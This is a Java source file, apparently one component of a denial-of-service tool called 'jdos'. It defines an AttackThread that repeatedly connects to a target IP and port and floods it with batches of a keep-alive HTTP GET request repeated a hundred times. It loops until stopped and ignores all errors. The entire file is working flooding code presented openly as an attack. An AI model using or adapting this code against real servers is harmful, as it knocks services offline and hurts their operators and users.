package com.filippo.jdos;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * @author Filippo Finke
 */
public class AttackThread extends Thread {

    private int index;
    private Jdos attack;
    private Socket socket;

    public int getIndex() {
        return index;
    }

    public AttackThread(int index, Jdos attack) {
        this.index = index;
        this.attack = attack;
    }

    public void kill() {
        interrupt();
        try {
            socket.close();
        } catch (Exception ex) {
        }
    }

    @Override
    public void run() {
        attack.ping(index);
        String ip = attack.getIp();
        int port = attack.getPort();

        String request = "GET / HTTP/1.1\r\n";
        request += "Host: " + ip + "\r\n";
        request += "Connection: keep-alive\r\n";
        request += "\r\n";

        byte[] bytes = request.repeat(100).getBytes();

        try {
            while (!isInterrupted()) {
                socket = new Socket();
                socket.connect(new InetSocketAddress(ip, port), 500);
                OutputStream out = socket.getOutputStream();
                for (int i = 0; i < 3; i++) {
                    out.write(bytes);
                    attack.ping(index);
                }
                out.flush();
                socket.close();
            }
        } catch (Exception exc) {
        }
    }

}
